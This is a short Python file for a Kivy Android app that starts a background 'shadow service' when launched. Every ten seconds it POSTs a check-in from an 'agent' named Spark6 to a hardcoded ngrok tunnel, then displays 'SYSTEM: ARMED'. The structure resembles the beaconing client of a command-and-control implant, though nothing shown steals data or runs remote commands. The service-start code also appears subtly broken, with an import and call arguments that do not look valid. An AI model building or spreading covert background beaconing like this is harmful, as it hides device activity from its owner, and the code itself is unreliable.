from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
import requests

class MuscleApp(App):
    def build(self):
        self.lbl = Label(text="🏛️ CENTRA SYSTEM\n[SHADOW SERVICE STARTING...]", halign="center")
        
        # Start the background service immediately
        self.start_shadow_service()
        
        # Periodic check for UI status
        Clock.schedule_interval(self.update_ui_status, 10)
        return self.lbl

    def start_shadow_service(self):
        try:
            # This triggers the 'services' defined in buildozer.spec
            from android import strptr
            service = autoclass('org.kivy.android.PythonService').mService
            PythonService = autoclass('org.kivy.android.PythonService')
            PythonService.start(service, strptr(''), strptr(''), strptr(''))
        except Exception as e:
            print(f"Service activation failed: {e}")

    def update_ui_status(self, dt):
        url = "https://unwomanly-jugate-dorathy.ngrok-free.dev"
        try:
            r = requests.post(url, json={"agent": "Spark6", "status": "UI_ACTIVE"}, timeout=10)
            self.lbl.text = f"🏛️ CENTRA LIAISON: OK\nLATENCY: STABLE\nSYSTEM: ARMED"
        except:
            self.lbl.text = "🏛️ CENTRA LIAISON: LOST\nRECONNECTING IN BACKGROUND..."

if __name__ == '__main__':
    MuscleApp().run()
